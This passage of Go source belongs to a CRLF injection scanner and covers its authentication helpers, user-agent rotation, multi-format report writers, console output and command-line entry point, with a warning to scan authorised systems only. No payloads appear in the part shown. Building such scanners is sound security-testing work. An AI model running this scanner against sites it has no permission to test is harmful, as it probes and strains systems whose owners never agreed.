			s.applyBasicAuth(req)
		case "bearer":
			s.applyBearerAuth(req)
		case "cookie":
			s.applyCookieAuth(req, urlStr)
		case "form":
			s.applyFormAuth(req, urlStr)
		}
	}

	// Add custom headers
	for key, value := range s.config.Auth.Headers {
		req.SetHeader(key, value)
	}
}

// Apply Basic Authentication
func (s *CRLFScanner) applyBasicAuth(req *resty.Request) {
	username := s.config.Auth.Credentials["username"]
	password := s.config.Auth.Credentials["password"]

	if username != "" && password != "" {
		auth := username + ":" + password
		encoded := base64.StdEncoding.EncodeToString([]byte(auth))
		req.SetHeader("Authorization", "Basic "+encoded)
	}
}

// Apply Bearer Authentication
func (s *CRLFScanner) applyBearerAuth(req *resty.Request) {
	for _, token := range s.config.Auth.Tokens {
		if token != "" {
			req.SetHeader("Authorization", "Bearer "+token)
			break
		}
	}
}

// Apply Cookie Authentication
func (s *CRLFScanner) applyCookieAuth(req *resty.Request, urlStr string) {
	// Try to authenticate and get session cookie
	// This is a simplified version - in reality, you'd make a login request
	for key, value := range s.config.Auth.Credentials {
		req.SetCookie(&http.Cookie{
			Name:  key,
			Value: value,
		})
	}
}

// Apply Form Authentication
func (s *CRLFScanner) applyFormAuth(req *resty.Request, urlStr string) {
	// This would typically involve:
	// 1. Making a GET request to login page
	// 2. Extracting CSRF token
	// 3. Making POST request with credentials
	// 4. Extracting session cookies

	// Simplified version for demonstration
	username := s.config.Auth.Credentials["username"]
	password := s.config.Auth.Credentials["password"]

	if username != "" && password != "" {
		formData := map[string]string{
			"username": username,
			"password": password,
		}

		// Try to login
		resp, err := req.SetFormData(formData).Post(urlStr + "/login")
		if err == nil && resp.StatusCode() == 200 {
			// Store cookies for future requests
			cookies := resp.Cookies()
			for _, cookie := range cookies {
				req.SetCookie(cookie)
			}

			// Create session
			session := &AuthSession{
				URL:      urlStr,
				Cookies:  cookies,
				Headers:  make(map[string]string),
				Tokens:   make(map[string]string),
				Valid:    true,
				LastUsed: time.Now(),
			}

			s.authSessions[urlStr] = session
		}
	}
}

// Get random user agent
func (s *CRLFScanner) getRandomUserAgent() string {
	if len(s.config.Scanner.UserAgents) == 0 {
		return DefaultUserAgent
	}
	return s.config.Scanner.UserAgents[rand.Intn(len(s.config.Scanner.UserAgents))]
}

// Save results
func (s *CRLFScanner) saveResults() {
	outputDir := s.config.Output.Directory
	if outputDir == "" {
		outputDir = "results"
	}

	// Create output directory
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		s.logger.Error().Err(err).Msg("Failed to create output directory")
		return
	}

	timestamp := time.Now().Format("2006-01-02_15-04-05")
	baseName := fmt.Sprintf("crlf_scan_%s", timestamp)

	// Save in requested formats
	for _, format := range s.config.Output.Formats {
		switch format {
		case "json":
			s.saveJSON(outputDir, baseName)
		case "html":
			s.saveHTML(outputDir, baseName)
		case "md", "markdown":
			s.saveMarkdown(outputDir, baseName)
		case "csv":
			s.saveCSV(outputDir, baseName)
		}
	}

	// Save spider data if enabled
	if s.config.Spider.Enabled && len(s.spiderData) > 0 {
		s.saveSpiderData(outputDir, baseName)
	}

	// Print summary
	s.printSummary()
}

// Save JSON results
func (s *CRLFScanner) saveJSON(outputDir, baseName string) {
	filePath := filepath.Join(outputDir, baseName+".json")

	report := map[string]interface{}{
		"scan_info": map[string]interface{}{
			"timestamp": time.Now(),
			"version":   Version,
			"targets":   s.config.Targets.URLs,
		},
		"statistics": s.stats,
		"results":    s.results,
		"spider_data": s.spiderData,
	}

	data, err := json.MarshalIndent(report, "", "  ")
	if err != nil {
		s.logger.Error().Err(err).Msg("Failed to marshal JSON")
		return
	}

	if err := os.WriteFile(filePath, data, 0644); err != nil {
		s.logger.Error().Err(err).Msg("Failed to save JSON")
	} else {
		s.logger.Info().Str("path", filePath).Msg("Results saved as JSON")
	}
}

// Save HTML report
func (s *CRLFScanner) saveHTML(outputDir, baseName string) {
	filePath := filepath.Join(outputDir, baseName+".html")

	htmlTemplate := `<!DOCTYPE html>
<html>
<head>
    <title>CRLF Injection Scan Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; line-height: 1.6; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 10px; margin-bottom: 30px; }
        .summary { background: #f8f9fa; padding: 20px; border-radius: 5px; margin: 20px 0; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
        .stat-box { background: white; padding: 20px; border-radius: 5px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .vuln-table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        .vuln-table th, .vuln-table td { border: 1px solid #ddd; padding: 12px; text-align: left; }
        .vuln-table th { background-color: #f2f2f2; }
        .severity-critical { background-color: #ffebee; }
        .severity-high { background-color: #fff3e0; }
        .severity-medium { background-color: #fffde7; }
        .severity-low { background-color: #e8f5e9; }
        .badge { padding: 4px 8px; border-radius: 4px; font-size: 0.8em; color: white; }
        .badge-critical { background: #e53935; }
        .badge-high { background: #fb8c00; }
        .badge-medium { background: #fdd835; color: #333; }
        .badge-low { background: #43a047; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>CRLF Injection Scan Report</h1>
            <p>Generated: {{.Timestamp.Format "2006-01-02 15:04:05"}}</p>
            <p>Version: {{.Version}}</p>
        </div>
        
        <div class="summary">
            <h2>Executive Summary</h2>
            <div class="stats-grid">
                <div class="stat-box">
                    <h3>{{.Statistics.TotalRequests}}</h3>
                    <p>Requests Made</p>
                </div>
                <div class="stat-box">
                    <h3>{{.Statistics.Vulnerabilities}}</h3>
                    <p>Vulnerabilities Found</p>
                </div>
                <div class="stat-box">
                    <h3>{{.Statistics.Critical}}</h3>
                    <p>Critical</p>
                </div>
                <div class="stat-box">
                    <h3>{{.Statistics.High}}</h3>
                    <p>High</p>
                </div>
                <div class="stat-box">
                    <h3>{{.Statistics.Medium}}</h3>
                    <p>Medium</p>
                </div>
                <div class="stat-box">
                    <h3>{{.Statistics.Low}}</h3>
                    <p>Low</p>
                </div>
            </div>
        </div>
        
        {{if .Results}}
        <h2>Vulnerabilities Found</h2>
        <table class="vuln-table">
            <thead>
                <tr>
                    <th>URL</th>
                    <th>Type</th>
                    <th>Severity</th>
                    <th>Payload</th>
                    <th>Evidence</th>
                </tr>
            </thead>
            <tbody>
                {{range .Results}}
                <tr class="severity-{{.Severity}}">
                    <td><a href="{{.URL}}" target="_blank">{{.URL}}</a></td>
                    <td>{{.InjectionType}}</td>
                    <td><span class="badge badge-{{.Severity}}">{{.Severity}}</span></td>
                    <td><code>{{.Payload}}</code></td>
                    <td><small>{{.Evidence}}</small></td>
                </tr>
                {{end}}
            </tbody>
        </table>
        {{else}}
        <div style="background: #d4edda; padding: 30px; border-radius: 5px; text-align: center;">
            <h3>🎉 No CRLF vulnerabilities found!</h3>
            <p>The scan did not detect any CRLF injection vulnerabilities.</p>
        </div>
        {{end}}
    </div>
</body>
</html>`

	reportData := struct {
		Timestamp  time.Time
		Version    string
		Statistics Statistics
		Results    []CRLFResult
	}{
		Timestamp:  time.Now(),
		Version:    Version,
		Statistics: s.stats,
		Results:    s.results,
	}

	tmpl, err := template.New("report").Parse(htmlTemplate)
	if err != nil {
		s.logger.Error().Err(err).Msg("Failed to parse HTML template")
		return
	}

	var buf bytes.Buffer
	if err := tmpl.Execute(&buf, reportData); err != nil {
		s.logger.Error().Err(err).Msg("Failed to execute HTML template")
		return
	}

	if err := os.WriteFile(filePath, buf.Bytes(), 0644); err != nil {
		s.logger.Error().Err(err).Msg("Failed to save HTML report")
	} else {
		s.logger.Info().Str("path", filePath).Msg("HTML report saved")
	}
}

// Save Markdown report
func (s *CRLFScanner) saveMarkdown(outputDir, baseName string) {
	filePath := filepath.Join(outputDir, baseName+".md")

	var buf bytes.Buffer

	buf.WriteString("# CRLF Injection Scan Report\n\n")
	buf.WriteString(fmt.Sprintf("**Generated**: %s\n\n", time.Now().Format("2006-01-02 15:04:05")))
	buf.WriteString(fmt.Sprintf("**Version**: %s\n\n", Version))

	buf.WriteString("## Executive Summary\n\n")
	buf.WriteString("| Metric | Count |\n")
	buf.WriteString("|--------|-------|\n")
	buf.WriteString(fmt.Sprintf("| Total Requests | %d |\n", s.stats.TotalRequests))
	buf.WriteString(fmt.Sprintf("| Vulnerabilities Found | %d |\n", s.stats.Vulnerabilities))
	buf.WriteString(fmt.Sprintf("| Critical | %d |\n", s.stats.Critical))
	buf.WriteString(fmt.Sprintf("| High | %d |\n", s.stats.High))
	buf.WriteString(fmt.Sprintf("| Medium | %d |\n", s.stats.Medium))
	buf.WriteString(fmt.Sprintf("| Low | %d |\n\n", s.stats.Low))

	if len(s.results) > 0 {
		buf.WriteString("## Vulnerabilities\n\n")

		for _, result := range s.results {
			buf.WriteString(fmt.Sprintf("### %s\n\n", result.URL))
			buf.WriteString(fmt.Sprintf("**Severity**: %s\n\n", result.Severity))
			buf.WriteString(fmt.Sprintf("**Type**: %s\n\n", result.InjectionType))
			buf.WriteString(fmt.Sprintf("**Payload**: `%s`\n\n", result.Payload))
			buf.WriteString(fmt.Sprintf("**Evidence**: %s\n\n", result.Evidence))
			buf.WriteString("---\n\n")
		}
	} else {
		buf.WriteString("## No vulnerabilities found\n\n")
		buf.WriteString("The scan did not detect any CRLF injection vulnerabilities.\n\n")
	}

	if err := os.WriteFile(filePath, buf.Bytes(), 0644); err != nil {
		s.logger.Error().Err(err).Msg("Failed to save Markdown report")
	} else {
		s.logger.Info().Str("path", filePath).Msg("Markdown report saved")
	}
}

// Save CSV results
func (s *CRLFScanner) saveCSV(outputDir, baseName string) {
	if len(s.results) > 0 {
		filePath := filepath.Join(outputDir, baseName+"_vulnerabilities.csv")

		var csvData [][]string
		csvData = append(csvData, []string{
			"URL", "Method", "Injection Type", "Parameter", "Header",
			"Payload", "Severity", "Status", "Evidence", "Timestamp",
		})

		for _, result := range s.results {
			csvData = append(csvData, []string{
				result.URL,
				result.Method,
				result.InjectionType,
				result.Parameter,
				result.Header,
				result.Payload,
				result.Severity,
				result.Status,
				result.Evidence,
				result.Timestamp.Format("2006-01-02 15:04:05"),
			})
		}

		file, err := os.Create(filePath)
		if err != nil {
			s.logger.Error().Err(err).Msg("Failed to create CSV file")
			return
		}
		defer file.Close()

		writer := csv.NewWriter(file)
		defer writer.Flush()

		if err := writer.WriteAll(csvData); err != nil {
			s.logger.Error().Err(err).Msg("Failed to write CSV")
		} else {
			s.logger.Info().Str("path", filePath).Msg("CSV report saved")
		}
	}
}

// Save spider data
func (s *CRLFScanner) saveSpiderData(outputDir, baseName string) {
	filePath := filepath.Join(outputDir, baseName+"_spider.json")

	data, err := json.MarshalIndent(s.spiderData, "", "  ")
	if err != nil {
		s.logger.Error().Err(err).Msg("Failed to marshal spider data")
		return
	}

	if err := os.WriteFile(filePath, data, 0644); err != nil {
		s.logger.Error().Err(err).Msg("Failed to save spider data")
	} else {
		s.logger.Info().Str("path", filePath).Msg("Spider data saved")
	}
}

// Print summary
func (s *CRLFScanner) printSummary() {
	au := aurora.NewAurora(s.config.Output.Color)

	fmt.Print("\n" + strings.Repeat("=", 80) + "\n")
	fmt.Print(au.Bold(au.Cyan(" CRLF INJECTION SCAN SUMMARY ")).String() + "\n")
	fmt.Print(strings.Repeat("=", 80) + "\n")

	fmt.Printf("\n%s: %d\n", au.Bold("Total Requests"), s.stats.TotalRequests)
	fmt.Printf("%s: %d\n", au.Bold("Spidered Pages"), s.stats.SpiderPages)
	fmt.Printf("%s: %d\n", au.Bold("Vulnerabilities Found"), s.stats.Vulnerabilities)
	fmt.Printf("%s: %d\n", au.Bold("Errors"), s.stats.Errors)

	if s.stats.Vulnerabilities > 0 {
		fmt.Print("\n" + au.Bold("Severity Breakdown:").String() + "\n")
		fmt.Print(strings.Repeat("-", 40) + "\n")

		colors := map[string]func(interface{}) aurora.Value{
			"critical": au.Red,
			"high":     au.Magenta,
			"medium":   au.Yellow,
			"low":      au.Blue,
		}

		severities := []struct {
			name  string
			count int64
		}{
			{"Critical", s.stats.Critical},
			{"High", s.stats.High},
			{"Medium", s.stats.Medium},
			{"Low", s.stats.Low},
		}

		for _, severity := range severities {
			if severity.count > 0 {
				colorFunc := colors[strings.ToLower(severity.name)]
				fmt.Printf("%s: %s\n",
					colorFunc(severity.name),
					colorFunc(strconv.FormatInt(severity.count, 10)))
			}
		}

		// Show top findings
		fmt.Print("\n" + au.Bold("Top Findings:").String() + "\n")
		fmt.Print(strings.Repeat("-", 40) + "\n")

		for i, result := range s.results[:min(5, len(s.results))] {
			colorFunc := colors[result.Severity]
			fmt.Printf("%d. [%s] %s\n", i+1,
				colorFunc(strings.ToUpper(result.Severity)),
				result.URL)
			fmt.Printf("   Type: %s | Payload: %s\n",
				result.InjectionType, result.Payload)
		}
	} else {
		fmt.Print("\n" + au.Green("✅ No vulnerabilities found!").String() + "\n")
	}

	fmt.Print("\n" + strings.Repeat("=", 80) + "\n")
	fmt.Print(au.Cyan("📁 Reports saved to: " + s.config.Output.Directory).String() + "\n")
	fmt.Print(strings.Repeat("=", 80) + "\n")
}

// Utility functions
func uniqueStrings(slice []string) []string {
	keys := make(map[string]bool)
	var list []string
	for _, entry := range slice {
		if _, value := keys[entry]; !value {
			keys[entry] = true
			list = append(list, entry)
		}
	}
	return list
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func max(a, b int) int {
	if a > b {
		return a
	}
	return b
}

// displayProgress shows a real-time progress spinner during scanning
func (s *CRLFScanner) displayProgress() {
	spinnerChars := []string{"⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"}
	startTime := time.Now()
	
	au := aurora.NewAurora(s.config.Output.Color)
	
	for i := 0; ; i++ {
		select {
		case <-s.ctx.Done():
			// Clear the progress line
			fmt.Print("\r" + strings.Repeat(" ", 80) + "\r")
			return
		default:
			elapsed := time.Since(startTime).Round(time.Second)
			reqs := atomic.LoadInt64(&s.stats.TotalRequests)
			vulns := atomic.LoadInt64(&s.stats.Vulnerabilities)
			
			// Build the progress line
			progressLine := fmt.Sprintf("\r%s %s | Time: %s | Requests: %d | Vulnerabilities: %d", 
				spinnerChars[i%len(spinnerChars)],
				au.Cyan("Scanning...").String(),
				elapsed,
				reqs,
				vulns)
			
			// Print and pad to clear any previous content
			fmt.Print(progressLine + strings.Repeat(" ", max(0, 80-len(stripAnsi(progressLine)))) + "\r")
			
			time.Sleep(100 * time.Millisecond)
		}
	}
}

// Helper function to strip ANSI codes for length calculation
func stripAnsi(str string) string {
	re := regexp.MustCompile(`\x1b\[[0-9;]*[a-zA-Z]`)
	return re.ReplaceAllString(str, "")
}

// displaySpinner displays an animated spinner with a message
func displaySpinner(message string, duration time.Duration) {
	spinnerChars := []string{"⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"}
	done := make(chan bool)
	
	go func() {
		for i := 0; ; i++ {
			select {
			case <-done:
				return
			default:
				fmt.Printf("\r%s %s", spinnerChars[i%len(spinnerChars)], message)
				time.Sleep(100 * time.Millisecond)
			}
		}
	}()
	
	time.Sleep(duration)
	done <- true
	fmt.Printf("\r%s %s\n", "✓", message)
}

// displayWelcomeTUI displays a fancy welcome TUI interface
func displayWelcomeTUI() {
	au := aurora.NewAurora(true)
	
	// Clear screen and set cursor position
	fmt.Print("\033[2J\033[H")
	
	// Display ASCII art banner
	banner := `
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  ██████╗██████╗ ██╗     ███████╗    ██╗███╗   ██╗██╗  ██╗███████╗ ██████╗   ║
║ ██╔════╝██╔══██╗██║     ██╔════╝    ██║████╗  ██║██║ ██╔╝██╔════╝██╔═══██╗  ║
║ ██║     ██████╔╝██║     █████╗      ██║██╔██╗ ██║█████╔╝ █████╗  ██║   ██║  ║
║ ██║     ██╔══██╗██║     ██╔══╝      ██║██║╚██╗██║██╔═██╗ ██╔══╝  ██║   ██║  ║
║ ╚██████╗██║  ██║███████╗███████╗    ██║██║ ╚████║██║  ██╗███████╗╚██████╔╝  ║
║  ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ║
║                                                                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║                     Advanced CRLF Injection Scanner                          ║
║                            Version: %s                                        ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
`
	
	// Print banner with color
	fmt.Println(au.Cyan(fmt.Sprintf(banner, Version)))
	
	// Display loading animation
	fmt.Println("\n" + strings.Repeat(" ", 20) + au.BrightBlue("🚀 Initializing Scanner...").String())
	displaySpinner("Loading modules", 2*time.Second)
	displaySpinner("Initializing HTTP client", 1*time.Second)
	displaySpinner("Preparing payloads", 1*time.Second)
	
	// Display feature list
	features := []string{
		"✓ CRLF Injection Detection",
		"✓ Spider/Crawler",
		"✓ Authentication Support",
		"✓ Multi-threaded Scanning",
		"✓ Comprehensive Reporting",
		"✓ Rate Limiting",
		"✓ Custom Payloads",
		"✓ Header Injection Testing",
	}
	
	fmt.Println("\n" + strings.Repeat(" ", 20) + au.Bold(au.Green("✨ Features:")).String())
	for _, feature := range features {
		fmt.Println(strings.Repeat(" ", 22) + au.Green(feature).String())
		time.Sleep(150 * time.Millisecond)
	}
	
	// Display disclaimer
	fmt.Println("\n" + strings.Repeat(" ", 10) + au.Yellow("⚠️  DISCLAIMER: Use only on authorized systems!").String())
	fmt.Println(strings.Repeat(" ", 10) + au.Yellow("   Unauthorized testing is illegal and unethical.").String())
	
	// Countdown to start
	fmt.Println("\n" + strings.Repeat(" ", 20) + au.BrightCyan("Starting scan in:").String())
	for i := 3; i > 0; i-- {
		fmt.Printf("\r%s %s%d%s ", 
			strings.Repeat(" ", 24),
			au.BrightRed("➤").String(),
			i,
			au.BrightRed("...").String())
		time.Sleep(1 * time.Second)
	}
	
	fmt.Printf("\r%s %s\n\n", 
		strings.Repeat(" ", 20),
		au.BrightGreen("✅ Starting scan now!").String())
	
	time.Sleep(500 * time.Millisecond)
}

// Main function
func main() {
	var (
		url        = flag.String("u", "", "URL to scan")
		urlFile    = flag.String("uf", "", "File containing URLs to scan")
		configPath = flag.String("c", "", "Path to configuration file")
		threads    = flag.Int("t", DefaultThreads, "Number of threads")
		timeout    = flag.Int("timeout", 0, "Timeout in seconds (0=use config)")
		outputDir  = flag.String("o", "results", "Output directory")
		verbose    = flag.Bool("v", false, "Verbose output")
		rateLimit  = flag.Int("r", RateLimit, "Rate limit (requests per second)")
		noSpider   = flag.Bool("no-spider", false, "Disable spider")
		auth       = flag.Bool("auth", false, "Enable authentication")
		version    = flag.Bool("version", false, "Show version")
		noTUI      = flag.Bool("no-tui", false, "Disable TUI interface")
	)

	flag.Usage = func() {
		displayBanner()
		fmt.Fprintf(os.Stderr, "\nUsage: %s [options]\n\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Options:\n")
		flag.PrintDefaults()
		fmt.Fprintf(os.Stderr, "\nExamples:\n")
		fmt.Fprintf(os.Stderr, "  %s -u https://example.com\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "  %s -uf urls.txt -t 100 -timeout 60 -r 20 -o ./scan_results\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "  %s -u https://example.com --auth -c config.yaml\n", os.Args[0])
	}

	flag.Parse()

	if *version {
		fmt.Printf("CRLF Injection Scanner v%s\n", Version)
		os.Exit(0)
	}

	// Display TUI interface unless disabled
	if !*noTUI {
		displayWelcomeTUI()
	} else {
		displayBanner()
	}

	// Create scanner
	scanner, err := NewCRLFScanner(*configPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
		os.Exit(1)
	}

	// Override config with command line arguments
	if *threads > 0 {
		scanner.config.Scanner.Threads = *threads
	}
	if *timeout > 0 {
		scanner.config.Scanner.Timeout = *timeout
	}
	if *outputDir != "" {
		scanner.config.Output.Directory = *outputDir
	}
	if *verbose {
		scanner.config.Output.Verbose = true
		scanner.logger = scanner.logger.Level(zerolog.DebugLevel)
	}
	if *rateLimit > 0 {
		scanner.config.Scanner.RateLimit = *rateLimit
	}
	if *noSpider {
		scanner.config.Spider.Enabled = false
	}
	if *auth {
		scanner.config.Auth.Enabled = true
	}

	// Add URLs from command line
	if *url != "" {
		urlStr := strings.TrimSpace(*url)
		if urlStr != "" {
			scanner.config.Targets.URLs = append(scanner.config.Targets.URLs, urlStr)
		}
	}

	// Create default wordlist if it doesn't exist
	if err := createDefaultWordlist("wordlists/urls.txt"); err != nil {
		fmt.Printf("Warning: Could not create wordlist: %v\n", err)	
	}

	// Add URLs from file
	if *urlFile != "" {
		if data, err := os.ReadFile(*urlFile); err == nil {
			lines := strings.Split(string(data), "\n")
			for _, line := range lines {
				line = strings.TrimSpace(line)
				if line != "" && !strings.HasPrefix(line, "#") {
					scanner.config.Targets.URLs = append(scanner.config.Targets.URLs, line)
				}
			}
		}
	}

	// Initialize random seed
	rand.Seed(time.Now().UnixNano())

	// Run scan
	if err := scanner.Run(); err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
		os.Exit(1)
	}
}
